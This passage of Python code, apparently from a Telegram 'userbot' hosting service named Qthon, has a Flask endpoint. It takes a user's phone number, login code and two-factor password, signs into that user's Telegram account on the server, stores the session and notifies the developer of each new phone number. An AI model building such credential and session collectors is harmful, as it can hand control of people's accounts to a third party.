    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    password = request.form.get('password')
    if not phone or not code or phone not in pending_logins:
        return jsonify({"status": "error", "message": "Invalid session"}), 400
    client, phone_code_hash, api_id, api_hash = pending_logins[phone]
    try:
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            if not password:
                return jsonify({"status": "error", "message": "2FA password required"}), 401
            await client.sign_in(password=password)
        active_clients[phone] = client
        client_me[phone] = await client.get_me()
        del pending_logins[phone]
        await save_all_sessions()
        start_client_in_background(client, phone)
        # إشعار المطور بمستخدم جديد
        await notify_dev(f"New user activated: {phone}")
        return jsonify({"status": "success", "message": "Telethon Qthon installed successfully"})
    except Exception as e:
        logger.error(f"Verify error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

def start_main_loop():
    asyncio.set_event_loop(main_loop)
    main_loop.run_until_complete(load_all_sessions())
    asyncio.ensure_future(auto_save_sessions_loop(), loop=main_loop)
    main_loop.run_forever()

loop_thread = threading.Thread(target=start_main_loop, daemon=True)
loop_thread.start()

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    logger.info("Bot started")
    # إشعار المطور بأن البوت قيد التشغيل
    await notify_dev("Bot is now running and ready.")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run_coroutine_threadsafe(main(), main_loop)
    logger.info("Qthon Server Started")
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
